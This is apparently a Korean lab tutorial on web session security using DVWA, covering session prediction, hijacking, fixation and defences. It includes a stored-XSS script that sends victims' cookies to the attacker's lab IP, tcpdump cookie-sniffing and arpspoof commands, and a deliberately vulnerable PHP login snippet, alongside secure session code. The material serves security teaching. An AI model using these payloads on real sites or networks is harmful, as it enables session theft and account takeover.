---
title: "[Web Security Lab] 06. Session Security"
date: 2026-06-01 15:00:00 +0900
categories:
  - 웹보안
  - 세션보안
tags:
  - Session
  - Cookie
  - SessionHijacking
  - SessionFixation
  - DVWA
  - 웹모의해킹
pin: false
math: false
mermaid: true
---

## 실습 환경

| 구분 | 내용 |
|---|---|
| 공격자 | Kali Linux (192.168.0.10) |
| 대상 | Ubuntu + DVWA (192.168.0.30/DVWA/) |
| 도구 | Burp Suite, tcpdump, python3 |

---

## 1. 이론: HTTP 무상태성과 세션

### 1.1 왜 세션이 필요한가

HTTP는 **Stateless(무상태)** 프로토콜이다.  
요청과 응답이 끝나면 서버는 이전 요청을 기억하지 않는다.

이 특성 때문에 "로그인 상태 유지"가 기본적으로 불가능하다.  
그래서 서버는 **세션(Session)** 이라는 임시 저장 공간을 만들고,  
브라우저는 **쿠키(Cookie)** 를 통해 세션 ID를 매 요청마다 서버에 전달한다.

```mermaid
sequenceDiagram
    participant U as 사용자
    participant B as 브라우저
    participant S as 서버

    U->>B: 아이디/비밀번호 입력
    B->>S: POST /login
    S->>S: 인증 성공 → 세션 생성 (PHPSESSID=abc123)
    S->>B: Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure
    B->>S: GET /mypage (Cookie: PHPSESSID=abc123)
    S->>B: 로그인된 사용자로 응답
```

즉 세션 ID가 곧 **"나는 로그인된 사람이다"** 라는 증명서다.  
이 증명서를 탈취당하면 비밀번호 없이도 계정이 도용된다.

---

### 1.2 세션 공격 유형 3가지

| 공격 유형 | 핵심 원리 | 필요 조건 |
|---|---|---|
| **Session Hijacking** | 이미 발급된 세션 ID를 탈취하여 사용자 가장 | 유효한 세션 ID 획득 |
| **Session Fixation** | 공격자가 미리 세션 ID를 정해 피해자가 그 ID로 로그인하도록 유도 | 로그인 전 세션 ID 주입 가능 |
| **Session Prediction** | 세션 ID의 패턴/규칙을 분석해 유효한 세션 추측 | 취약한 세션 ID 생성 알고리즘 |

---

### 1.3 세션 하이재킹 공격 경로

```mermaid
flowchart TD
    A[세션 하이재킹 공격 경로] --> B[네트워크 도청]
    A --> C[XSS 쿠키 탈취]
    A --> D[로컬 쿠키 파일 접근]

    B --> B1["비암호화 HTTP 환경에서</br>tcpdump / Wireshark로</br>Cookie 헤더 추출"]
    C --> C1["Stored/Reflected XSS로</br>document.cookie를</br>공격자 서버에 전송"]
    D --> D1["악성코드 감염 기기에서</br>브라우저 쿠키 DB 직접 열람"]
```

---

### 1.4 쿠키 보안 속성

| 속성 | 역할 |
|---|---|
| `HttpOnly` | JS로 쿠키 읽기 불가 → XSS 쿠키 탈취 방지 |
| `Secure` | HTTPS에서만 전송 → 네트워크 도청 방지 |
| `SameSite=Strict/Lax` | 외부 사이트 요청 시 쿠키 미전송 → CSRF 방지 |
| `Expires/Max-Age` | 유효기간 설정 → 세션 만료 처리 |
| `Domain/Path` | 쿠키가 유효한 도메인/경로 범위 제한 |

> **핵심**: 세션 쿠키에는 `HttpOnly + Secure + SameSite=Strict` 를 기본으로 설정해야 한다.
{: .prompt-tip }

---

## 2. 실습 1 — Weak Session IDs (세션 ID 예측)

**경로**: DVWA > Weak Session IDs

### 2.1 실습 목표

세션 ID가 얼마나 예측하기 쉬운지 레벨별로 확인하고, Low 레벨에서 실제 세션 탈취를 시도한다.

### 2.2 진행 절차

**1단계: DVWA Weak Session IDs 페이지 접속**

```
http://192.168.0.30/DVWA/vulnerabilities/weak_id/
```

**2단계: "Generate" 버튼을 여러 번 눌러 세션 ID 변화 관찰**

Burp Suite Proxy를 통해 응답 헤더에서 `dvwaSession` 쿠키 값을 확인한다.

**3단계: 레벨별 세션 ID 패턴 비교**

| 레벨 | 세션 ID 패턴 | 취약점 |
|---|---|---|
| **Low** | 순차 증가 숫자 (1, 2, 3...) | 완전 예측 가능 |
| **Medium** | Unix Timestamp | 접속 시각 추측 시 예측 가능 |
| **High** | 랜덤 MD5 해시 | 예측 불가 (안전) |
| **Impossible** | HMAC + 서버 비밀키 | 위조 불가 |

**4단계: Low 레벨에서 세션 탈취 시도**

Burp Suite > Repeater에서 `Cookie: dvwaSession=5` 처럼 순차 값을 수동 입력한 뒤,  
다른 사용자의 세션으로 교체하여 응답 차이를 확인한다.

### 2.3 결과 분석

Low 레벨처럼 세션 ID가 1씩 증가한다면,  
공격자는 현재 접속 중인 다른 사용자의 세션 ID를 **1씩 증가시켜 모두 시도** 하는 것만으로 탈취가 가능하다.

> **교훈**: 세션 ID는 **128bit 이상의 암호학적 난수** 로 생성해야 한다.
{: .prompt-warning }

---

## 3. 실습 2 — XSS를 이용한 쿠키 탈취 (세션 하이재킹)

### 3.1 공격 흐름

```mermaid
sequenceDiagram
    participant A as 공격자 (Kali)
    participant V as 피해자 (브라우저)
    participant S as DVWA 서버

    A->>S: Stored XSS 게시글 작성<br/>(쿠키 탈취 스크립트 삽입)
    V->>S: 게시글 조회
    S->>V: 악성 스크립트가 포함된 HTML 응답
    V->>A: document.cookie를 Kali로 전송
    A->>S: 탈취한 세션 ID로 접속 (피해자 가장)
```

### 3.2 진행 절차

**1단계: Kali에서 쿠키 수신 서버 실행**

```bash
python3 -m http.server 8000
```

**2단계: DVWA > XSS (Stored) 에서 악성 스크립트 게시**

```
http://192.168.0.30/DVWA/vulnerabilities/xss_s/
```

Name 필드 또는 Message 필드에 아래 스크립트 입력:

```javascript
<script>
var img = new Image();
img.src = 'http://192.168.0.10:8000/steal?cookie=' + document.cookie;
</script>
```

> Low 레벨에서는 입력 필터링 없이 그대로 저장된다.
{: .prompt-info }

**3단계: 피해자가 게시글 조회**

다른 브라우저(또는 시크릿 창)에서 동일한 게시글 페이지를 방문하면,  
Kali의 http.server 로그에 다음과 같이 쿠키가 기록된다:

```
192.168.0.30 - - [01/Jun/2026] "GET /steal?cookie=PHPSESSID=abcdef123456;%20security=low HTTP/1.1" 200 -
```

**4단계: 탈취한 세션 ID로 접속**

방법 A — Burp Suite Repeater:
1. Burp Suite > Proxy > HTTP History에서 DVWA 요청 선택
2. "Send to Repeater"
3. Cookie 헤더의 PHPSESSID 값을 탈취한 값으로 교체
4. Send → 피해자 세션으로 응답 수신 확인

방법 B — 브라우저 DevTools:
1. F12 > Application > Cookies
2. `PHPSESSID` 값을 탈취한 세션 ID로 직접 수정
3. 페이지 새로고침 → 피해자 계정으로 로그인된 상태 확인

---

## 4. 실습 3 — Session Fixation 시나리오

### 4.1 공격 원리

세션 고정(Session Fixation)은 **공격자가 세션 ID를 먼저 정하고**,  
피해자가 그 ID를 그대로 사용해 로그인하도록 유도하는 공격이다.

```mermaid
sequenceDiagram
    participant A as 공격자
    participant V as 피해자
    participant S as 취약한 서버

    A->>S: 일반 접속 → 세션 ID 획득 (PHPSESSID=attack123)
    A->>V: http://192.168.0.30/DVWA/?PHPSESSID=attack123 링크 전달
    V->>S: 해당 링크로 접속 후 로그인 시도
    S->>S: 로그인 성공 (세션 ID 변경 없이 attack123 유지)
    A->>S: 동일한 attack123으로 접속 → 인증된 세션 사용
```

### 4.2 취약한 코드 vs 안전한 코드

**취약한 코드 (세션 ID 재발급 없음)**:

```php
<?php
session_start();
if (login_success($username, $password)) {
    $_SESSION['user'] = $username;
    // 로그인 후에도 세션 ID가 그대로 유지됨!
    // 공격자가 미리 심어둔 세션 ID를 그대로 인증에 사용
}
?>
```

**안전한 코드 (로그인 후 세션 ID 재발급)**:

```php
<?php
session_start();
if (login_success($username, $password)) {
    session_regenerate_id(true);  // 기존 세션 파기 + 새 세션 ID 발급
    $_SESSION['user'] = $username;
}
?>
```

`session_regenerate_id(true)` 호출 시:
- 기존 세션 파일 삭제 (`true` 파라미터)
- 새로운 세션 ID 생성 및 쿠키 재발급
- 공격자가 심어둔 세션 ID는 무효화

> **로그인, 권한 상승, 비밀번호 변경 직후에는 반드시 세션 ID를 재발급해야 한다.**
{: .prompt-danger }

---

## 5. 실습 4 — 네트워크 도청으로 세션 탈취

HTTP(비암호화) 환경에서 ARP Spoofing 또는 동일 네트워크 접근이 가능한 경우,  
`tcpdump` 로 세션 쿠키를 직접 추출할 수 있다.

### 5.1 tcpdump로 쿠키 추출

```bash
# Kali에서 실행 (eth0는 자신의 인터페이스로 교체)
tcpdump -i eth0 -A \
  'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' \
  | grep -i "cookie"
```

HTTP 요청 패킷 중 `Cookie:` 헤더가 포함된 라인이 출력된다:

```
Cookie: PHPSESSID=abcdef123456; security=low
```

### 5.2 ARP Spoofing + 도청 (개념)

```bash
# 게이트웨이와 피해자 사이에 끼어들기 (arpspoof 사용)
arpspoof -i eth0 -t 192.168.0.30 192.168.0.1
arpspoof -i eth0 -t 192.168.0.1 192.168.0.30
```

이후 tcpdump로 192.168.0.30의 HTTP 트래픽을 수신하면  
피해자의 세션 쿠키를 평문으로 확인할 수 있다.

> **이 공격은 HTTPS 환경에서는 동작하지 않는다.** TLS 암호화가 세션 쿠키를 보호한다.  
> DVWA는 HTTP로 운영되므로 실습 환경에서만 확인 가능하다.
{: .prompt-warning }

---

## 6. 실습 5 — Burp Suite로 세션 관리 분석

### 6.1 세션 토큰 엔트로피 분석 (Sequencer)

Burp Suite에는 세션 토큰의 랜덤성(엔트로피)을 분석하는 **Sequencer** 기능이 있다.

1. **Proxy > HTTP History** 에서 세션 쿠키가 포함된 응답 선택
2. 우클릭 > **"Send to Sequencer"**
3. Sequencer > **"Start live capture"** 클릭
4. 충분한 샘플(수백 개) 수집 후 **"Analyze now"**

| 결과 | 의미 |
|---|---|
| 엔트로피 낮음 (< 64bit) | 세션 ID 예측 가능 → 취약 |
| 엔트로피 높음 (> 128bit) | 충분히 안전 |

### 6.2 Comparer로 세션 ID 패턴 비교

1. Sequencer에서 여러 세션 ID 샘플 수집
2. **Comparer** 에 붙여넣기
3. 시각적으로 패턴/반복 구조 확인

Low 레벨의 순차 숫자 세션은 Comparer에서 뚜렷한 패턴이 보인다.

---

## 7. 방어 방법

### 7.1 개발자 관점: 안전한 세션 설정 (PHP 예시)

```php
<?php
// 세션 쿠키에 보안 속성 적용
session_set_cookie_params([
    'lifetime' => 1800,        // 30분 후 만료
    'path'     => '/',
    'secure'   => true,        // HTTPS에서만 전송
    'httponly' => true,        // JS 접근 불가
    'samesite' => 'Strict'     // 외부 사이트 요청 시 미전송
]);
session_start();

// 로그인 성공 후 반드시 세션 ID 재발급
if (login_success($username, $password)) {
    session_regenerate_id(true);
    $_SESSION['user'] = $username;
    $_SESSION['login_time'] = time();
}

// 30분 무활동 시 자동 로그아웃
if (isset($_SESSION['login_time'])) {
    if (time() - $_SESSION['login_time'] > 1800) {
        session_destroy();
        header("Location: /login");
        exit();
    }
    $_SESSION['login_time'] = time(); // 활동 시 갱신
}
?>
```

### 7.2 방어 체크리스트

| 항목 | 설명 |
|---|---|
| 세션 ID 재발급 | 로그인, 권한 변경 후 `session_regenerate_id(true)` |
| HttpOnly 쿠키 | JS로 쿠키 읽기 불가 → XSS 탈취 방지 |
| Secure 쿠키 | HTTPS 전용 전송 → 네트워크 도청 방지 |
| SameSite=Strict | 외부 사이트 요청 시 쿠키 차단 → CSRF 방지 |
| 세션 만료 설정 | 30분 무활동 자동 로그아웃 |
| 충분한 엔트로피 | 세션 ID 128bit 이상 암호학적 난수 |
| HTTPS 강제 적용 | 네트워크 도청 원천 차단 |
| 재인증 요구 | 비밀번호 변경·결제 등 중요 작업 시 재로그인 |
| IP 바인딩 (보조) | 세션과 IP 연결 (모바일 환경 주의) |

> **가장 중요한 두 가지**: HTTPS 강제 + 로그인 후 세션 ID 재발급  
> 이 둘만 제대로 지켜도 세션 공격의 대부분을 차단할 수 있다.
{: .prompt-tip }

---

## 8. 정리

```mermaid
flowchart LR
    A[세션 보안 핵심] --> B[세션 ID 생성]
    A --> C[세션 ID 전달]
    A --> D[세션 관리]

    B --> B1["128bit 이상</br>암호학적 난수 사용"]
    B --> B2["로그인 후</br>세션 ID 재발급"]

    C --> C1["HttpOnly</br>(JS 접근 차단)"]
    C --> C2["Secure</br>(HTTPS 전용)"]
    C --> C3["SameSite=Strict</br>(CSRF 방지)"]

    D --> D1["30분 무활동</br>자동 만료"]
    D --> D2["로그아웃 시</br>서버 세션 파기"]
    D --> D3["중요 작업 시</br>재인증 요구"]
```

세션 보안의 핵심은 세 단계에서 모두 방어를 적용하는 것이다.

1. **세션 ID 생성 단계**: 예측 불가능하게 만들고, 인증 후 재발급
2. **세션 ID 전달 단계**: 쿠키 보안 속성으로 탈취 경로 차단
3. **세션 관리 단계**: 적절한 만료와 무효화 처리

DVWA 실습을 통해 각 취약점이 실제로 어떻게 동작하는지 확인하고,  
방어 코드 적용 전후의 차이를 직접 비교해 보는 것이 이 실습의 목표다.
